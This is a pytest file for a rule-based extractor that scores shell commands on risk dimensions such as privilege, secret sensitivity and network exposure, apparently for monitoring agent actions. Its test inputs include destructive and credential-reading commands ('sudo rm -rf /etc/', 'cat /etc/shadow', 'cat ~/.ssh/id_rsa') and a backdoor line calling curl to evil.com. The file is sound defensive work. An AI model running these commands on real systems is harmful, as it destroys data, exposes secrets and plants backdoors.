"""Tests for rule-based behavioral feature extraction."""

from __future__ import annotations

import numpy as np

from frontier_ops.sensing.extractors import CONCEPTS, BehavioralExtractor


class TestBehavioralExtractor:
    """Core interface and magnitude tests."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_returns_all_concepts(self):
        scores = self.ext.extract("git status")
        assert set(scores.keys()) == set(CONCEPTS)

    def test_values_in_unit_range(self):
        texts = [
            "sudo rm -rf /etc/",
            "curl -X POST https://api.example.com",
            "cat ~/.ssh/id_rsa",
            "echo 'import os' >> backdoor.py",
        ]
        for text in texts:
            scores = self.ext.extract(text)
            for dim, val in scores.items():
                assert 0.0 <= val <= 1.0, (
                    f"Out of range: {dim}={val} for '{text}'"
                )

    def test_dangerous_actions_have_high_magnitude(self):
        """Dangerous actions should have large L2 norm (not normalized to 1)."""
        scores = self.ext.extract("sudo rm -rf /etc/")
        vec = np.array([scores[c] for c in CONCEPTS])
        assert np.linalg.norm(vec) > 1.0  # multiple dims active

    def test_benign_actions_have_low_magnitude(self):
        scores = self.ext.extract("git status")
        vec = np.array([scores[c] for c in CONCEPTS])
        assert np.linalg.norm(vec) < 0.01

    def test_zero_vector_for_no_signal(self):
        scores = self.ext.extract("hello world")
        vec = np.array([scores[c] for c in CONCEPTS])
        assert np.linalg.norm(vec) < 0.01

    def test_deterministic(self):
        text = "sudo rm -rf /etc/"
        s1 = self.ext.extract(text)
        s2 = self.ext.extract(text)
        assert s1 == s2

    def test_case_insensitive(self):
        s1 = self.ext.extract("GIT PUSH --FORCE")
        s2 = self.ext.extract("git push --force")
        assert s1 == s2

    def test_not_l2_normalized(self):
        """Raw magnitudes are preserved — NOT projected to unit sphere."""
        scores = self.ext.extract("sudo rm -rf /etc/")
        vec = np.array([scores[c] for c in CONCEPTS])
        l2 = np.linalg.norm(vec)
        # Multiple dims fire at high values, so L2 norm should exceed 1
        assert l2 > 1.0, f"Expected L2 > 1.0 for dangerous action, got {l2}"


class TestBenignActions:
    """Verify benign actions produce near-zero vectors."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def _assert_benign(self, text: str):
        scores = self.ext.extract(text)

        # No dimension should exceed 0.3
        for dim, score in scores.items():
            assert score <= 0.3, (
                f"Benign '{text}': {dim}={score} > 0.3"
            )
        # L2 norm should be near zero
        vec = np.array([scores[c] for c in CONCEPTS])
        l2 = np.linalg.norm(vec)
        assert l2 < 0.5, f"Benign '{text}': L2 norm {l2} >= 0.5"

    def test_git_status(self):
        self._assert_benign("git status")

    def test_python_pytest(self):
        self._assert_benign("python3 -m pytest")

    def test_git_log_oneline(self):
        self._assert_benign("git log --oneline")

    def test_git_diff(self):
        self._assert_benign("git diff HEAD~1")

    def test_ls_current_dir(self):
        self._assert_benign("ls -la")

    def test_cat_local_file(self):
        self._assert_benign("cat results/output.json")

    def test_grep_local(self):
        self._assert_benign("grep -r 'def test' .")

    def test_find_local(self):
        self._assert_benign("find . -name '*.py'")

    def test_head_tail(self):
        self._assert_benign("head -20 script.py")
        self._assert_benign("tail -f log.txt")

    def test_wc(self):
        self._assert_benign("wc -l file.py")


class TestFilesystemScope:
    """Dim 0: filesystem_scope."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_relative_path_zero(self):
        raw = self.ext.extract_with_detail("cat ./file.py")["scores"]
        assert raw["filesystem_scope"] == 0.0

    def test_home_subdir(self):
        raw = self.ext.extract_with_detail("ls ~/project/")["scores"]
        assert raw["filesystem_scope"] >= 0.3

    def test_system_dir(self):
        raw = self.ext.extract_with_detail("ls /etc/nginx/")["scores"]
        assert raw["filesystem_scope"] >= 0.9

    def test_etc_passwd(self):
        raw = self.ext.extract_with_detail("cat /etc/passwd")["scores"]
        assert raw["filesystem_scope"] == 1.0

    def test_proc(self):
        raw = self.ext.extract_with_detail("cat /proc/cpuinfo")["scores"]
        assert raw["filesystem_scope"] >= 0.9


class TestInformationSensitivity:
    """Dim 1: information_sensitivity."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_ssh_key(self):
        raw = self.ext.extract_with_detail("cat ~/.ssh/id_rsa")["scores"]
        assert raw["information_sensitivity"] >= 0.8

    def test_env_file(self):
        raw = self.ext.extract_with_detail("cat .env")["scores"]
        assert raw["information_sensitivity"] >= 0.8

    def test_password_mention(self):
        raw = self.ext.extract_with_detail(
            "grep -r password /etc/"
        )["scores"]
        assert raw["information_sensitivity"] >= 0.6

    def test_bearer_token(self):
        raw = self.ext.extract_with_detail(
            'curl -H "Authorization: Bearer $TOKEN" https://api.com'
        )["scores"]
        assert raw["information_sensitivity"] >= 0.5

    def test_database_url(self):
        raw = self.ext.extract_with_detail(
            "echo $DATABASE_URL"
        )["scores"]
        assert raw["information_sensitivity"] >= 0.4

    def test_stripe_key(self):
        raw = self.ext.extract_with_detail(
            "export STRIPE_SECRET_KEY=sk_live_xxx"
        )["scores"]
        # STRIPE_ + secret = at least 1.0 (capped)
        assert raw["information_sensitivity"] >= 0.6

    def test_additive_stacking(self):
        raw = self.ext.extract_with_detail(
            "cat .env | grep password token secret"
        )["scores"]
        # .env (0.8) + password (0.6) + token (0.6) + secret (0.6) = 2.6 → capped 1.0
        assert raw["information_sensitivity"] == 1.0

    def test_etc_shadow(self):
        raw = self.ext.extract_with_detail("cat /etc/shadow")["scores"]
        assert raw["information_sensitivity"] >= 0.9


class TestActionReversibility:
    """Dim 2: action_reversibility."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_read_only_zero(self):
        for cmd in ["cat file.py", "ls -la", "grep foo bar", "git log", "git status"]:
            raw = self.ext.extract_with_detail(cmd)["scores"]
            assert raw["action_reversibility"] == 0.0, f"Failed for: {cmd}"

    def test_git_add_low(self):
        raw = self.ext.extract_with_detail("git add .")["scores"]
        assert raw["action_reversibility"] == 0.3

    def test_git_commit_moderate(self):
        raw = self.ext.extract_with_detail("git commit -m 'fix'")["scores"]
        assert raw["action_reversibility"] == 0.5

    def test_git_push_high(self):
        raw = self.ext.extract_with_detail("git push origin main")["scores"]
        assert raw["action_reversibility"] == 0.7

    def test_rm_destructive(self):
        raw = self.ext.extract_with_detail("rm -rf /tmp/stuff")["scores"]
        assert raw["action_reversibility"] == 1.0

    def test_git_push_force_destructive(self):
        raw = self.ext.extract_with_detail("git push --force")["scores"]
        assert raw["action_reversibility"] == 1.0

    def test_drop_table(self):
        raw = self.ext.extract_with_detail("DROP TABLE users")["scores"]
        assert raw["action_reversibility"] == 1.0

    def test_curl_delete(self):
        raw = self.ext.extract_with_detail(
            "curl -X DELETE https://api.com/user/1"
        )["scores"]
        assert raw["action_reversibility"] == 1.0


class TestNetworkExposure:
    """Dim 3: network_exposure."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_local_zero(self):
        raw = self.ext.extract_with_detail("cat file.py")["scores"]
        assert raw["network_exposure"] == 0.0

    def test_git_fetch_low(self):
        raw = self.ext.extract_with_detail("git fetch origin")["scores"]
        assert raw["network_exposure"] == 0.3

    def test_pip_install_moderate(self):
        raw = self.ext.extract_with_detail("pip install requests")["scores"]
        assert raw["network_exposure"] == 0.5

    def test_git_push_high(self):
        raw = self.ext.extract_with_detail("git push origin main")["scores"]
        assert raw["network_exposure"] == 0.7

    def test_curl_post_very_high(self):
        raw = self.ext.extract_with_detail(
            "curl -X POST https://api.example.com/data"
        )["scores"]
        assert raw["network_exposure"] == 0.9

    def test_curl_with_auth_max(self):
        raw = self.ext.extract_with_detail(
            'curl -H "Authorization: Bearer $TOKEN" https://api.external.com'
        )["scores"]
        assert raw["network_exposure"] == 1.0

    def test_ssh(self):
        raw = self.ext.extract_with_detail("ssh user@remote.com")["scores"]
        assert raw["network_exposure"] >= 0.9

    def test_wget(self):
        raw = self.ext.extract_with_detail("wget https://example.com/file")["scores"]
        assert raw["network_exposure"] == 0.7


class TestExecutionPrivilege:
    """Dim 4: execution_privilege."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_normal_ops_zero(self):
        raw = self.ext.extract_with_detail("ls -la")["scores"]
        assert raw["execution_privilege"] == 0.0

    def test_chmod(self):
        raw = self.ext.extract_with_detail("chmod 644 file.py")["scores"]
        assert raw["execution_privilege"] == 0.4

    def test_sudo_general(self):
        raw = self.ext.extract_with_detail("sudo apt update")["scores"]
        assert raw["execution_privilege"] == 0.7

    def test_sudo_rm_rf(self):
        raw = self.ext.extract_with_detail("sudo rm -rf /etc/nginx")["scores"]
        assert raw["execution_privilege"] == 0.9

    def test_su_root(self):
        raw = self.ext.extract_with_detail("su root")["scores"]
        assert raw["execution_privilege"] == 1.0

    def test_visudo(self):
        raw = self.ext.extract_with_detail("visudo")["scores"]
        assert raw["execution_privilege"] == 1.0

    def test_write_to_etc(self):
        raw = self.ext.extract_with_detail("echo 'hack' > /etc/hosts")["scores"]
        assert raw["execution_privilege"] >= 0.9


class TestCodeGenerationRatio:
    """Dim 5: code_generation_ratio."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_reading_code_zero(self):
        for cmd in ["cat script.py", "grep def .", "find . -name '*.py'"]:
            raw = self.ext.extract_with_detail(cmd)["scores"]
            assert raw["code_generation_ratio"] == 0.0, f"Failed for: {cmd}"

    def test_running_script_low(self):
        raw = self.ext.extract_with_detail("python3 script.py")["scores"]
        assert raw["code_generation_ratio"] == 0.3

    def test_pytest(self):
        raw = self.ext.extract_with_detail("python3 -m pytest")["scores"]
        assert raw["code_generation_ratio"] == 0.3

    def test_git_commit_moderate(self):
        raw = self.ext.extract_with_detail("git commit -m 'feat'")["scores"]
        assert raw["code_generation_ratio"] == 0.5

    def test_sed_inline(self):
        raw = self.ext.extract_with_detail(
            "sed -i 's/foo/bar/g' file.py"
        )["scores"]
        assert raw["code_generation_ratio"] == 0.7

    def test_inline_python(self):
        raw = self.ext.extract_with_detail(
            "python3 -c 'print(1+1)'"
        )["scores"]
        assert raw["code_generation_ratio"] == 1.0

    def test_echo_code_to_file(self):
        raw = self.ext.extract_with_detail(
            'echo "import os; os.system(\'curl ...\')" >> backdoor.py'
        )["scores"]
        assert raw["code_generation_ratio"] >= 0.7


class TestCompoundActions:
    """Multi-dimension activation on complex commands."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_cat_ssh_key(self):
        """cat ~/.ssh/id_rsa → high filesystem_scope AND information_sensitivity."""
        raw = self.ext.extract_with_detail("cat ~/.ssh/id_rsa")["scores"]
        assert raw["filesystem_scope"] >= 0.3  # home subdir
        assert raw["information_sensitivity"] >= 0.8  # ssh key
        assert raw["action_reversibility"] == 0.0  # read-only

    def test_grep_password_etc(self):
        """grep -r password /etc/ → high fs + sensitivity, low reversibility."""
        raw = self.ext.extract_with_detail("grep -r password /etc/")["scores"]
        assert raw["filesystem_scope"] >= 0.9
        assert raw["information_sensitivity"] >= 0.6
        assert raw["action_reversibility"] == 0.0  # grep is read-only

    def test_curl_post_with_auth(self):
        """curl -X POST with Bearer token → high network + sensitivity."""
        text = 'curl -X POST -H "Authorization: Bearer $TOKEN" https://api.external.com'
        raw = self.ext.extract_with_detail(text)["scores"]
        assert raw["network_exposure"] >= 0.9
        assert raw["information_sensitivity"] >= 0.5

    def test_sudo_rm_etc(self):
        """sudo rm -rf /etc/ → high on ALL dims except maybe code_generation."""
        raw = self.ext.extract_with_detail("sudo rm -rf /etc/")["scores"]
        assert raw["filesystem_scope"] >= 0.9
        assert raw["action_reversibility"] == 1.0
        assert raw["execution_privilege"] >= 0.9

    def test_backdoor_injection(self):
        """echo code >> backdoor.py → high code_generation, possibly network."""
        text = 'echo "import os; os.system(\'curl http://evil.com\')" >> backdoor.py'
        raw = self.ext.extract_with_detail(text)["scores"]
        assert raw["code_generation_ratio"] >= 0.7
        assert raw["network_exposure"] >= 0.7  # curl present
        assert raw["action_reversibility"] >= 0.7  # echo >>


class TestExtractWithDetail:
    """Test the detail/debug interface."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_returns_all_fields(self):
        detail = self.ext.extract_with_detail("sudo rm -rf /")
        assert "scores" in detail
        assert "l2_norm" in detail
        assert "matched_patterns" in detail

    def test_scores_match_extract(self):
        """extract_with_detail scores should equal extract output."""
        text = "git push --force"
        scores = self.ext.extract(text)
        detail = self.ext.extract_with_detail(text)
        assert scores == detail["scores"]

    def test_l2_norm_correct(self):
        detail = self.ext.extract_with_detail("git push --force")
        vec = np.array([detail["scores"][c] for c in CONCEPTS])
        np.testing.assert_allclose(detail["l2_norm"], np.linalg.norm(vec), atol=1e-5)

    def test_matched_patterns_nonempty_for_active_dims(self):
        detail = self.ext.extract_with_detail("sudo chmod 777 /etc/hosts")
        patterns = detail["matched_patterns"]
        assert len(patterns["execution_privilege"]) > 0
        assert len(patterns["filesystem_scope"]) > 0


class TestEdgeCases:
    """Edge cases and boundary conditions."""

    def setup_method(self):
        self.ext = BehavioralExtractor()

    def test_empty_string(self):
        scores = self.ext.extract("")
        vec = np.array([scores[c] for c in CONCEPTS])
        assert np.linalg.norm(vec) < 0.01

    def test_whitespace_only(self):
        scores = self.ext.extract("   \n\t  ")
        vec = np.array([scores[c] for c in CONCEPTS])
        assert np.linalg.norm(vec) < 0.01

    def test_very_long_text(self):
        text = "cat file.py " * 1000
        scores = self.ext.extract(text)
        # Should not crash, and should still be valid
        assert set(scores.keys()) == set(CONCEPTS)

    def test_unicode_text(self):
        scores = self.ext.extract("echo '日本語テスト' > output.txt")
        assert set(scores.keys()) == set(CONCEPTS)

    def test_no_signal_is_zero(self):
        """If no patterns match, output should be all zeros."""
        scores = self.ext.extract("just some plain text")
        vec = np.array([scores[c] for c in CONCEPTS])
        assert np.allclose(vec, 0.0)
